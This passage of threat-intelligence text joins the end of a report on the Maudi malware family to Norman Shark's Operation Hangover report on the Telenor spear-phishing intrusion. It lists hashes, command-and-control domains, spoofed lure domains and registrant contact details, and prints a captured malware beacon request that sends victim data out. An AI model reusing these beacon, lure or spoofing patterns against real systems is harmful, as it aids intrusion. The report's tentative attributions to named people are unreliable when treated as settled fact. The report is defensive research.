bd9a1fbd76c00015a59a3b5c93d4030e , zwdb c64aab79e5107fc8ffd4699288c2e3be , gzzx c9f33d544c5657d4ba55a92e06e38d06 , Qbxt 49c7cae0fda8e5089e993a169c6c4197 , krgqy 914fdaf7aa098ac00067a2b265fc91da , qq o hlemonk @ 163.com - domain registration This address was used to register the Maudi domains mol-government.com and newsyandex.com , used to host C & C for these samples : c93f8a7a899142db1e92138b76407588 227636fb88e19eca33a02cbb46f279fb 6e88c39c270e259c4472f6eceb8a241f 865fec48937686c2d0708847f30b1264 c07e857d2602d2a813fd23d711871571 a25e5bcc52c386eb046149799ed81b2b 3563c21cf5c46e8e39f17e733c2b9b1e , h511b0 e78d39d1862338e4c711238223618e44 , h511b0 This registrant has also registered a great deal of other dodgy domains .
Mol - government.com and these other domains have been used as C & C by Sogu / Thoper trojans in attacks on apparent Korean and Mongolian targets , as well as by other malwares like PcClient .
o yt.bodologetee.com – domain This domain has been used as Command & Control domain for a number of samples .
It has also been documented used by PlugX malware in campaigns apparently against Mongolian targets .
The same registration information was used to register yahoomesseges.com , which has been used by EvilGrab malware .
0cf15b88b18cdedfaae598e9498768e3 , beijingnew 1e60824de00ce3c1f62fddc54a9c5c93 , jiagu c64dd5393a17226b208b049a4b766bd6 , jiagu 646cfe960219f1948eac580e3bd836f8 , text1 ef404a76bd11e1d675b7686775ed7f1c , nsc01 o YNK JAPAN Inc – digital certificate As previously mentioned , two samples were digitally signed using a certificate belonging to YNK JAPAN Inc. ; a subsidiary of a Korean game producer .
This certificate has been used in several hundred samples spanning various campaigns and incidents .
One of these was the SK intrusion in 2011 , where one of the initial malwares - a Sogu / Thoper trojan - was signed with it .
771a376df6aba0ce31e0c8e43cdf0800 , xfish c3d14ee0bd01ebc9e5844578babe462f , xfish The Maudi malware family seems to have been mostly used against Chinese / South - East Asian targets .
However , it shares some indicators ( C & C domains , registration information ) with other , more high - profile attacks .
What these connections mean is unclear .
It might be just sharing of information between groups ; we know that there is quite a bit of sharing going on , particularly of malware and source code .
Less is known about how much is shared in terms of infrastructure ( ex .
domains ) .
It is our opinion , however , that the Maudi system hints at something else .
There is for example a large amount of samples that use the same self - signed certificates in addition to overlaps in other indicators .
Self - signed certificates have little value in the underground as they can be freely made ; so there is little reason for sharing these .
Instead the impression is that these malwares have been signed by the same malware creation system .
Another aspect is the architecture where default PoisonIvy shellcode blobs are overridden with configuration information from the dropper .
This also may indicate homegrown build tools , possibly to alleviate language issues with the PoisonIvy builder itself .
There is a possibility that this indicates a large group of attackers , but might also be a part of a Digital Quartermaster function , as recently postulated by FireEye .
This report details a sophisticated cyberattack infrastructure that appears to originate from India , conducted by private threat actors with no evidence of state - sponsorship .
It has likely been in operation for over three years , primarily as a platform for surveillance against targets of national security interest that are mostly based in Pakistan and possibly in the United States .
It is also used for industrial espionage against the Norwegian telecom corporation Telenor and other civil- ian corporations .
Evidence points to professional project management and outsourcing of key tasks , including some by freelance programmers .
On March 17 , 2013 a Norwegian newspaper reported that the country 's telecommunications giant Telenor had filed a criminal police case for an unlawful computer intrusion .
Spear phishing emails targeting upper management appeared to be the source of the infection Through extensive analysis , security analysts at Norman Shark in conjunction with our partners , quickly uncovered a previously unknown and sophisticated infrastructure for targeted attacks .
The primary purpose of this long - running , global command - and - control net- work appears to be surveillance against national security interests .
Private- ··· sector industrial espionage in fields as diverse as natural resources , telecommu- nications , law , food & restaurants , and manufacturing is likely a secondary pur- pose of this network .
Based on analysis of IP addresses collected from criminal data stores discov- ered during the investigation , it appears that potential victims have been target- ed in over a dozen countries , most heavily represented by Pakistan , Iran , and the United States .
Targets include government , military , and civilian organizations Spear phishing to carefully - selected target individuals was the primary attack vector identified in the investigation .
The attackers went to great lengths to make the social engineering aspects of the attack appear as credible and applica- ble as possible .
In many cases , decoy files and websites were used , specifically geared to the particular sensibilities of regional targets including cultural and religious sub- ject matter .
Victims would click on what appeared to be an interesting docu- ment , and begin the long - running infection cycle .
Despite all of the recent media attention on so - called `` zero - day '' exploits en- compassing brand new , never - before - seen attack methods , Operation Hangover appears to have relied exclusively upon well - known , previously identified vul- nerabilities in Java , Word documents , and web browsers .
Favored methods include documents infected with malicious code , along with direction to malicious websites with names deliberately similar to legitimate government , entertainment , security related , and commercial sites .
Often the user would be presented with a legitimate document or software download they were expecting to see , along with an unseen malicious download .
Operation Hangover utilizes a very extensive and sophisticated command - and- control infrastructure , likely developed over many months or years by numer- ous developers .
Our investigation revealed evidence of professional project management practices used to design frameworks , modules , and sub- components .
Individual malware authors were assigned certain tasks , and com- ponents were `` outsourced '' to what appear to be freelance programmers .
In recent months , much focus has been on China – including both state- sponsored and individual actors – but Operation Hangover contains notable hallmarks of originating exclusively in India .
We base this attribution with a very high degree of confidence on our extensive analysis of IP addresses , web- site domain registrations , and text - based identifiers contained within the mali- cious code itself .
All indications point to private syndicates of threat actors following their own motivations , with no direct evidence of state - sponsorship by the Indian government or by any other nation .
> Discovery of a security breach at Norway - based Telenor uncovered a long running , sophisticated global cyberattack infrastructure that likely continues to this day .
In this report we detail a cyberattack infrastructure that appears to be Indian in origin .
This infrastructure has been in operation for at least three years , more likely close to four years .
The purpose of this framework seems predominantly to be a platform for surveillance against targets of national security interest ( such as Pakistan ) , but we will also show how it has been used for industrial espionage against the Norwegian telecom corporation Telenor and other civilian corporations .
None of the information contained in the following report is intended to implicate any individual or entity , or suggest inappropriate activity by any individual or entity mentioned .
On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the telecommunications giant Telenor had filed a case with Norwegian criminal police ( `` KRIPOS '' ) over what was perceived as an unlawful intrusion into their computer network .
The infection was reported to have been conducted via `` spear phishing '' emails sent to people in the upper tiers of management .
Initially , we had no information or visibility into this case .
However , after some time Norwegian CERT ( NorCERT ) shared some data from the event , which included md5 hashes of malicious files and information about which Command and Control servers were used .
However , the data we were given acted as a starting point for more data mining , and within a short period of time it became obvious that we were seeing a previously unknown and very extensive infrastructure for targeted attacks .
This paper is the result of the ensuing investigation .
The samples we have uncovered seem to have been created from approximately September 2010 until the present day .
It appears 2012 was a very active year for this group , which saw escalation not only in numbers of created malware files but also in targets .
There is no sign that the attacks will slow down in 2013 , as we see new attacks continuously .
> We would like to thank NorCERT , the Norwegian National Security Authority , Telenor and Telenor SOC for their assistance and cooperation during the investigation of this case .
We would also like to thank ESET for graciously sharing information they were in possession of , and finally we would like to express our gratitude to the people who created our database and analysis systems .
These systems enable us to do the data correlation needed to find needles in haystacks , so their creators own a large part of this paper as well .
C & C , C2 , CC : Command- and Control server .
Typically used about the computer the malware connects to in order to report status .
Drop : The online location where malware delivers stolen information .
FUD : One meaning of this acronym is `` Fear , Uncertainty and Doubt '' , but in the malware underground FUD means Fully UnDetectable , i.e .
the program is not detected by antivirus tools .
MD5 : A so - called hash – i.e .
a number calculated on the basis of data that identifies these with high confidence .
MD5 's in this paper are used to identify files .
RTF : Rich Text Format , a document format SFX : Self - extracting .
Executable programs that are also archives , and which extract and sometimes execute the archive content when run .
Sinkholing : A technique of re - registering a domain that has previously been used for malicious purposes .
By doing this , machines that are still infected connect to our computer instead of the attacker 's , and we can log the connection attempts .
Spear phishing : To send emails with malicious content ( attachments , links , or fraudulent messages ) to specific persons of particular interest .
Zero day exploits : Program code to attack software vulnerabilities for which there is no patch .
Initially we had no knowledge of the malware samples involved in the attack on Telenor .
However , some days after the attack we received MD5 hashes of the samples used .
We only found two of these samples in our own datasets , but we later directly received copies of most other samples connected with the case ( Appendix A ) .
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' .
( MD5 bd52237db47ba7515b2b7220ca64704e ) .
This was a selfextracting ( SFX ) ZIP archive that contained two files , as shown below .
When run , the installer will execute the included `` conhosts.exe '' file and open the decoy document '' legal operations.doc '' .
`` legal operations.doc '' and `` 220113.doc '' also included in the mail are identical save for their size , and are actually specially crafted RTF files designed to trigger a software vulnerability ( CVE-2012 - 0158 ) in Microsoft Common Controls , typically triggered in Microsoft Word .
If the vulnerability is triggered , embedded code in the document will be run .
This code is encrypted , but after decryption its real purpose becomes visible : The files conhosts.exe ( MD5 02d6519b0330a34b72290845e7ed16ab ) and windwn.exe ( MD5 bfd2529e09932ac6ca18c3aaff55bd79 ) are both minimally obfuscated Visual Basic executables .
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws / snwd.php ? tp=1 & tg= [ ID ] & tv = Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : * / * Accept - Encoding : gzip , deflate User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET
CLR 2.0.50727 ; .NET
CLR 3.0.04506.648 ; .NET
CLR 3.5.21022 ; .NET4.0C
) Host : wreckmove.org Connection : Keep - Alive Other samples found connected to the case were Delphi information stealers ( some highly targeted , down to individual username ) , file splitter tools , C++ information stealers ( keyloggers , screen grabbers and file harvesters ) , and various other malware written in Visual Basic .
The following C & C domains / IP addresses were observed used in the attack : wreckmove.org infocardiology.biz enlighten-energy.org researcherzone.net 151.237.188.167 gadgetscorner.org On the 3rd of April the attackers created another attack package and placed it on the URL http : //mail.telenor.no - cookieauth.dll - getlogon - reason-0.formdir-1-curl - z2fowaz2f.infocardiology.biz/ 01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip .
The package is quite similar to the first , though the decoy document is this time a Powerpoint presentation , `` 01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt '' .
This is an apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation .
The included trojan downloader connects this time back to the domain torqspot.org .
The attackers also created the subdomain internet-security-suite-review.toptenreviews.com.infocardiology.biz , a spoof of the real toptenreviews.com site .
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor .
The Telenor - related attack seems not to be over .
The behaviour pattern and the file structure of known files made it possible to search internal and public databases for similar cases .
The large amount of new malware being created makes it infeasible to conduct malware - related investigations of any scale without strong database support .
In our case , we preserve the behavioural information of all files processed by our internal bank of Norman MAG2 automatic analysis systems .
There are also several public and commercial databases available for additional data mining , and Google is invaluable .
The amount of malware we found through this was surprisingly large , and it became clear that the Telenor intrusion was not a single attack but part of a continuous effort to attack and compromise governments and corporations around the world .
While investigating the extra cases we identified , we accidentally discovered that a number of their C & C servers contained world readable folders .
We were able to navigate into these and secure the data stored there .
The data contained in these folders were mainly connection logs , keylogs and other uploaded data from computers affected with malware .
Many of the collected logs were from automated analysis systems belonging to security companies , but not all .
An important find we did on these servers were additional malicious executables , probably meant to be served to infected users .
Some of these executables were digitally signed with a certificate which was revoked in 2011 : Searching our certificate databases we found a large number of other executables similarly signed , none of which were found to be innocent applications .
In almost all cases , the domains registered by the attackers are `` privacy protected '' .
This means that the registrant has paid the domain registrar to withhold identity information related to the registration .
This is done almost to perfection .
Another feature is that almost all websites belonging to this attacker has their robots.txt set to `` disallow '' to stop them from being crawled .
However , by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure .
These domains were then further verified against malware samples to ascertain valid connection to attackers .
Some care needs to be taken when working with IP addresses , as there are possibilities of false correlations on , for example , domain parking IP addresses , sinkholes and webhosting servers .
Additional data may be gleaned by querying the IP addresses themselves .
Many have set up a default ESMTP ( mail ) server on port 587/tcp , which responds with a configured banner .
For example , the domain onlinestoreapp.net ( used by malware MD5 a7b5fce4390629f1756eb25901dbe105 ) resolved to the IP address 37.59.231.161 , and this happens when connecting to that IP on ESMTP : All of this enabled us to draw a domain map over the infrastructure ( next page ) .
This map is probably larger than shown here ; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious , and many domains we have not found yet .
Conversely , many of the domains plotted were used in attacks years ago and may never be again .
Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their malware , this is rarely done by this attack group .
As far as we can tell they are only using known vulnerabilities ; no zero day attacks .
The first exploit we observed was included in the RTF files used in the Telenor attack .
The exploit in question was CVE-2012 - 0158 , a very common vulnerability to exploit .
The actual document is binary very similar to other documents ( 51ee31f234db61b488647915f8d7d4c8 , 00978e4b81ac577f328d6add75d0890e , 17a31d1075ebce41ba48a9efacb79d28 ...
) which have been used in other targeted attacks by these threat actors .
The shellcode contains a date check , which means it will stop working after a certain date .
In the Telenor case , the date was February 16th 2013 , and in the most recent variations the timeout date is set to May 21nd 2013 .
If the exploit is triggered before the timeout date the shellcode does two different things : • Posts system info ( machinename , timezone , ID , running processes ) to a PHP script residing on the website random123.site11.com .
• Downloads and executes an executable from remote sites .
We have seen softmini.net , www.infocardiology.biz , www.getmedia.us , www.technopenta.org , and autowidge.org used for this .
• The executables downloaded have usually themselves been downloaders .
In a couple of cases we have observed final payload to be Dark Comet , a well - known backdoor trojan , but unusual for this group to use .
When we investigated the attacker domain structure we found more exploit code .
This time it was implemented as a script in the main web page of the domain you-post.net .
The exploit is this time CVE- 2012 - 4792 , an Internet Explorer vulnerability .
When it triggers it downloads and runs a malicious executable from the domain softmini.net ; also the domain used by two of the three documents mentioned above .
Softmini.net seems to be a hub for exploitcode ; its subdomain get.adobe.flash.softmini.net contains an active Java exploit ( CVE-2012 - 0422 ) which attempts to install the same trojan as the IE exploit above .
Most of the first stage malware we ' ve seen used in attacks are variants of Smackdown , a large family of Visual Basic downloaders which for the most part seem to be written by a person calling himself `` Yash '' or `` Yashu '' .
These have evolved over time and are using different levels of obfuscation on text strings .
Typically the trojan begins by uploading system information to a PHP script on the C & C server .
The attacker can decide separately which infected machine should receive additional malware .
The second stage malware is usually Hanove but other malware families are also used .
The second stage malware are often variants of HangOver , information stealers written in C++ .
They appear to be written over a common framework as many internal functions are identical , but overall functionality can vary quite a bit from one subtype to another .
The first versions of these may have been based on code from an innocent backup utility as the word `` backup '' is often present .
Hanove Uploaders recursively scan folders looking for files to upload .
What kind of files they look for are usually defined in resources as an extension list , and these lists vary .
Here are a few examples : Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file .
Some variants capture other data as well , such as clipboard content , screenshots , titles of open windows and content of browser edit fields .
Timed events are set up to upload the data to the remote server .
The stolen data are uploaded to remote servers by FTP or HTTP .
A typical HTTP request looks like this : UserAgent strings vary between versions .
The following have been seen in connection with this family : Boundary parameters vary between versions .
The following have been seen in connection with this family : F39D45E70395ABFB8D8D2BFFC8BBD152 , 90B452BFFF3F395ABDC878D8BEDBD152 FFF3F395A90B452BB8BEDC878DDBD152 , 5A9DCB8FFF3F02B8B45BE39D152 5A902B8B45BEDCB8FFF3F39D152 , 78DDB5A902BB8FFF3F398B45BEDCD152 2BB8FFF3F39878DDB5A90B45BEDCD152 , 905ABEB452BFFFBDC878D83F39DBD152 D2BFFC8BBD152F3B8D89D45E70395ABF , 8765F3F395A90B452BB8BEDC878 90ABDC878D8BEDBB452BFFF3F395D152 , F12BDC94490B452AA8AEDC878DCBD187 String content consists of some strings largely static between variants , and some that vary .
Non - static strings are browser UserAgent strings , MIME boundary tags , mutexes , domain names , paths , and registry keys , which also may be obfuscated by being fragmented .
Many Hanove variants use a simple rotating encoding scheme to hide the interesting strings .
For example , the domain `` wearwellgarments.eu '' is hidden as `` xfbsxfmmhbsnfout / fv '' and the word `` php '' becomes `` qiq '' .
Different variants are frequently given internal names , visible through debug paths included in the binary .
Such internal names used include `` HangOver '' , `` Ron '' , `` Dragonball '' , `` Tourist '' , `` Klogger '' , '' FirstBlood '' and `` Babylon '' .
There are several other malwares and tools in use .
See appendix C for more indicators .
We have direct knowledge of only one attack – the one against Telenor .
During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups .
We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains .
We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them ; enough to identify targets down to IP and machine name / domain level .
This showed a geographical distribution where Pakistan was the most affected in volume , but also showed a multitude of other countries being represented .
Note that these data should be taken as indicative only .
IP counts are misleading for many reasons .
One machine can generate many IP addresses , and some IP addresses are probably lab machines .
However , the indication that Pakistan is the most prevalent target seems solid .
In the following pages we ' ve highlighted some of the files we have seen used to attack organizations in different countries .
As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible .
The most obvious target seems to be Pakistan .
As is visible above , computers in Pakistan are by far the most active in connecting to malicious domains .
We found logs in the open drop folders that contained suggestive data , such as this snippet from a 2012 log entry ( subdomain redacted ) : Host Name : PC - PS2CHAIRMAN Registered Owner : admin Time Zone : ( GMT+05:00 ) Islamabad , Karachi Domain : * * * * .gov.pk Sinkhole - logged HTTP requests are also informative , such as this seemingly from a Pakistani embassy : '' GET /sdata / shopx.php ? fol = EMBASSYOFPAKIST - Embassy % 20of % 20Pakistan ...
..
'' Decoy files tailored towards Pakistan revolve around the ongoing conflicts in the region , regional culture and religious matters .
Additional examples can be found in Appendix B .
China is another country which apparently has been targeted to some extent .
For example , we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution .
This dump was generated in July 2012 and contains Word documents , PowerPoint presentations and images .
Decoys are also present , but not in the amount as is seen against Pakistani targets .
This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India .
Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement 's creation in 1971 .
Examples of malware apparently aimed at the movement are md5 's a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa .
The former appears to be this file : http : //f00dlover.info / Khalistan / Victims_want_Sajjan_Kumar_punished.doc.zip It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure – for example the domain researcherzone.net which was used in the Telenor intrusion .
There are also a number of domains with active web pages that used to exist on this IP ; for example khalistancalling.com .
Khalistancalling.com has since moved on to another bad IP ( 46.182.104.83 ) and must be considered owned by the attackers .
The Nagaland ( or Nagalim ) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North - Eastern India and North - Western Burma .
We have seen at least two attacks apparently aimed at them .
A sample from 2010 , md5 168f2c46e15c9ce0ba6e698a34a6769e , showed a scanned document which appears to be a letter from the `` President of Nagalim '' .
The malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124 .
Zeusagency.org has hosted different malware ; one ( 3105b020e2bd43924404bc4e3940191b ) connected to fistoffury.net on the IP 176.31.65.126 .
The IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares .
These are somewhat different from the standard Hanove series , though functionality is roughly equivalent .
Another malicious installer ( md5 f1799d11b34685aa209171b0a4b89d06 ) contained the following decoy : While the Telenor case was most likely industrial espionage , we were initially unaware of other `` non- strategic / political '' targets by this attack group , but during our research we discovered several related attack files that were clearly targeting businesses .
As can be seen in the example below , the social engineering aspects are more related to business content .
We want to emphasize that except in the case of BUMI PLC , we have no information to suggest that any of the organizations named in the following pages have been compromised .
However , the available information strongly indicates that they were targets of interests for the attackers .
Likely target : Eurasian Natural Resources Corporation ( ENRC ) This company which is headquartered in London has operations in multiple countries , notably in Kazakhstan .
The following malwares appear to be aimed at ENRC .
ENRC__DEBT__INVESTORS__2012__for__your__Reference.exe ( MD5 e40205cba4e84a47b7c7419ab6d77322 ) Deatils_for_the_ENRC_Board_Meeting_X1098977e79.exe ( MD5 a5a740ce2f47eada46b5cae5facfe848 ) Details_for_the_ENRC_Board_Meeting_X10FR333_2012.exe ( MD5 2895a9b0cf22cd45421d634dc0f68db1 ) Detail_description_of_ferro_chrome_silicon_and_ferro_chrome.exe ( MD5 2102a18dc20dc6654c03e0e74f36033f ) Gerhard_Ammann_Article_Content_From_Wikipedia.exe ( MD5 d96aa87c25c9c491bee97aad65bafc9e ) When searching for known instances of domains belonging to the attack infrastructure , we found a published incident report made by Context Information Security .
This report details how the Chairman of Bumi PLC , Mr Samin Tan , had been exposed to a spear - phishing attack in July 2012 .
Bumi is an international mining group listed on the London Stock Exchange .
Both the domains mentioned in this report have been connected to the attack group investigated .
For example , the malware executable `` dua2alhycox12.exe '' ( c94267ba9c92f241379cdceed58777dc ) connects to hycoxcable.com , which anoniemvolmacht.com historically acted as name server for .
The latter domain has also shared IP with the malicious domain chronicleserv.org .
Likely target : Porsche Informatik A malware using the name `` webmailapp.exe '' ( 22a3a1d5a89866a81152cd2fc98cd6e2 ) is a self - extracting archive containing several files , among them a batch file opening a shortened URL pointing to Porsche Holding 's webmail front in Austria .
Target must be assumed to be persons affiliated with Porsche .
Again , we have no information as to whether any intrusion has occurred .
Possible target : Restaurant industry It appears unlikely that the restaurant and food industry should be the victim of targeted attacks .
However , that 's how it appears .
One indicator is the decoy file below , taken from the malicious executable `` Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe '' ( f52154ae1366ae889d0783730040ea85 ) .
Another indicator is the use of certain domain names , like the malicious bluebird- restaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk .
The latter is a restaurant in Chelsea , UK .
Likely target : Chicago Mercantile Exchange While investigating the malicious domain web-mail-services.info , we found a number of other domains that had shared the IP address 188.95.48.99 with it .
One of these domains was cmegroups.net , a spoof of cmegroup.com ; the domain belonging to Chicago Mercantile Exchange .
CME is the world 's largest futures exchange company .
An entry on WIPO , the UN arbitration body for domain name disputes , shows that a complaint regarding this domain name was leveled by CME against PrivacyProtect.org in 2012 .
The complaint was not disputed , and domain transferred to CME .
However , the most interesting information is found in the case details .
An interesting question is of course whether there were any attachments to this mail .
Other suggestive domain names that have been used include : server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de : The latter is the mail server for several German businesses , for example restaurants .
www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com : The latter is a Lebanese newspaper in Arabic .
account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de : The latter is a German producer of pumps for high - viscosity fluids .
deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com : Delta Airlines .
mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs mail.telenor.no : Telenor lynberrg.com vs lynberg.com : The latter belongs to Lynberg & Watkins , a US - based law firm .
mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs mail.carmel.us : The latter is the webmail address of Carmel & Carmel , a US - based law firm .
armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com : The latter is a US - based manufacturer of composite materials for armor : We do not know ( yet ) what purpose all these domains have , but it 's hard to imagine that the name spoofing is done by anything but malicious intent ; it is a common tactic in targeted attacks .
The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian origin .
Curiously , many of the executables we uncovered from related cases contained cleartext project and debug path strings ( see Appendix D for full list ) .
It is not very common to find malware with debug paths , but these particular threat actors did not seem to mind leaving such telltale signs , or maybe they were unaware of their presence .
These paths gave more indicators that the attackers were Indian .
First , many of the Visual Basic keyloggers contained the name `` Yash '' , which might be an abbreviation for several Indian names .
The trojans used against Telenor did not contain any such person name , but the Visual Basic project name is clearly related to others : Telenor case ( 02d6519b0330a34b72290845e7ed16ab , bfd2529e09932ac6ca18c3aaff55bd79 ) '' C : \miNaPro.vbp '' Related cases ( 4ad80ff251e92004f56bb1b531175a49 , 3d6a8b2df08443c2aa4b6a07a9b55b16 ) '' D : \YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack ( sep2012 ) \miNaPro.vbp '' This similarity is not coincidental ; these trojans are based on the same code and exhibit similar behaviour .
This and other text strings we initially saw gave further hints towards Indian attackers .
R : \payloads\ita nagar\Uploader\HangOver 1.5.7 ( Startup ) \HangOver 1.5.7 ( Startup ) \Release\Http_t.pdb C : \Users\neeru rana\Desktop\Klogger- 30 may\Klogger- 30 may\Release\Klogger.pdb C : \Users\Yash\Desktop\New folder\HangOver 1.5.7 ( Startup ) uploader\Release\Http_t.pdb The project paths also give a rare glimpse into something we almost never see – a managed malware creation environment , where multiple developers are tasked with specific malware deliverances .
This is visible in the way the projects themselves are organized : ...
Desktop\Feb 2012\kmail ( httpform1.1 ) ...
...
May Payload\new keylogger\Flashdance1.0.2\ ...
...
\Monthly Task\August 2011\USB Prop\ ...
...
\Sept 2012\Keylogger\Release\ ...
...
\June mac paylods\final Klogger-1 june - Fud from eset5.0\Klogger- 30 may\ ...
...
ner\Task\HangOver 1.2.2\Release ...
...
\august\13 aug\HangOver 1.5.7 ( Startup ) uploader\ ...
...
\task information\task of september\Tourist 2.4.3 ...
...
\final project backup\complete task of ad downloader & usb grabber & uploader\ ...
.. D
: \YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\ .. There are many diverging project paths which points towards different persons working on separate subprojects , but apparently not using a centralized source control system .
The projects seem to be delegated into tasks , of which some seem to follow a monthly cycle .
There are hints at team structures , like the string `` VB Team Matrix Production '' found in a sample ( fa6d2483f766f8431b6c0a8c78178d48 ) , an indication that a separate team works with Visual Basic development .
Some series of malware contain strings like `` delivered '' , which , together with the loose project structures may indicate that development work is being outsourced .
In a great number of isolated cases and contexts , the word `` Appin '' shows up and there seems to be some connection with the Indian security company called Appin Security Group .
By this , we are not implicating or suggesting inappropriate activity by Appin .
Maybe someone has tried to hurt Appin by falsifying evidence to implicate them .
Maybe some rogue agent within Appin Security Group is involved , or maybe there are other explanations .
Getting to the bottom of that is beyond our visibility .
For example , the strings `` Appin '' , `` AppinSecurityGroup '' , and `` Matrix '' are frequently found inside executables .
One example of this peculiarity is debug paths inside malware files : C : \BNaga\backup_28_09_2010\threads tut\pen - backup\BB_FUD_23\Copy of client\ Copy of client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb C : \BNaga\kaam\Appin SOFWARES\RON 2.0.0\Release\Ron.pdb C : \BNaga\SCode\BOT\MATRIX_1.2.2.0\appinbot_1.2_120308\Build\Win32\Release\deleter.pdb C : \Documents and Settings\Administrator\Desktop\Backup\17_8_2011\MATRIX_1.3.4\CLIENT\ Build\Win32\Release\appinclient.pdb D : \Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdb One should note that anyone can add or change such text strings .
As mentioned , the privacy - protection of domain registrations is almost perfect , but only almost .
There are a large number of domains used , and a few of these have been suspended and lost their privacy protection .
For example , the following malicious domains all used the same registration information NITR0RAC3.COM , VALL3Y.COM , S3RV1C3S.NET , GAUZPIE.COM , BLUECREAMS.COM : Registrant : NA Prakash ( mail @ gmail.com ) Jain TY-76 , Kohat Enclave Delhi Delhi,110034 IN Tel .
+ 011.9873456756 Identical registration information is also used for other domains that seem unrelated to the attack infrastructure , like hackerscouncil.com which May 12th 2011 had the following entry ( source : gwebtools.com ) .
April 3th 2011 , a little over a month before the registration entry above , hackerscouncil.com was registered by Appin Technologies .
This is possibly a coincidence .
HACKERSCOUNCIL.COM Registrant : Appin Technologies Rakesh Gupta ( rakesh.gupta @ appinonline.com ) 9th Floor , Metro Heights , NSP , PitamPura , Delhi Delhi,110034 IN Tel .
+ 91.1147063300 Creation Date : 17-Sep-2009 Expiration Date : 17-Sep-2011 The domain piegauz.net , which was used as a Command and Control domain for several trojan configurations was created April 21st 2010 and had the following initial registration information : PIEGAUZ.NET Registrant : PrivacyProtect.org Domain Admin ( contact @ privacyprotect.org ) P.O .
Box 97 Note - All Postal Mails Rejected , visit Privacyprotect.org Moergestel null,5066 ZH NL Tel .
+ 45.36946676 One trojan using this domain ( md5 4a44b6b6463fa1a8e0515669b10bd338 ) was submitted to the ThreatExpert analysis service October 28th 2010 , at which time the domain was operational and accepted uploads from the malware .
Three days later , October 31st 2010 , the domain got suspended , which removed its privacy protection : PIEGAUZ.NET Registrant : Appin Technologies Rakesh Gupta ( rakesh.gupta @ appinonline.com ) 9th Floor , Metro Heights , NSP , PitamPura , Delhi Delhi,110034 IN Tel .
+ 91.1147063300 Creation Date : 21-Apr-2010 Expiration Date : 21-Apr-2011 The domain bluecreams.com was initially registered by Appin Security Solutions Pvt .
Ltd. Sept 17th 2009 .
The day after it was put under privacy protection .
In the period from end of June 2010 to February 2011 it was documented as download domain for several trojans .
It was suspended Apr 18th 2011 and then displayed the already mentioned Prakash Jain as registrant .
Another example is the domain zerodayexploits.org .
This domain has a history of resolving to a series of malicious IP addresses used for malware attacks ( 173.236.24.254 , 8.22.200.44 ) .
This web site which offers bounties for zeroday exploits , claims to be founded by `` Appin Morpheus '' and powered by Appin .
Also the live behaviour of some domains shows the word Appin .
The malicious domains alr3ady.net , wearwellgarments.eu , ezservicecenter.org , secuina.net , go-jobs.net , shoperstock.com and maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197 .
All these IP 's return a recognizable ESMTP banner : Other interesting indicators were found when we examined the domain softservices.org ; a domain which has held several of the known malicious IP addresses used by this group ( 46.182.104.83 , 94.185.81.153 , 89.207.135.242 ) .
However , even if the domain was obviously connected , we could find no malware that used it .
Instead , we found this forum post on the Nokia developer forum : The interesting bit was found further down this thread , where the developer posted a snippet of source code : We then found the apparent developer 's profile on Elance , an online employment service for freelance programmers .
Based on this we suspect that there are or have been projects to develop mobile malware by this group , even if we have not found any related mobile malware in our databases .
Mantra Tech Ventures is the registration service for several of the malicious domains that have been in use .
The service first came to our attention because it was used for registering the Command & Control domains cobrapub.com , mymyntra.net , and n00b4u.com .
In addition , Mantra Tech Ventures owns abhedya.net , which seems to be a name server service for domains registered by them .
Abhedya has been used by several sites in the attack infrastructure like currentnewsstore.com , crvhostia.net , webmicrosoftupdate.net and fuzzyfile.net .
